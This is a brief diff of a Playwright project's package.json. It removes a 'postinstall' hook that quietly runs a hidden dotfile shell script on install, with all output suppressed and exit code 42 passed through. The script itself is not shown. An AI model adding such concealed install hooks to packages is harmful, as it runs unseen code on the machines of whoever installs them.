@@ -3,8 +3,7 @@
   "version": "1.0.0",
   "main": "index.js",
   "scripts": {
-    "test": "npx playwright test tests/WebAPIOopsPart1.spec.js --headed",
-    "postinstall": "sh ./.ci-e6sep5.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "test": "npx playwright test tests/WebAPIOopsPart1.spec.js --headed"
   },
   "keywords": [],
   "author": "",
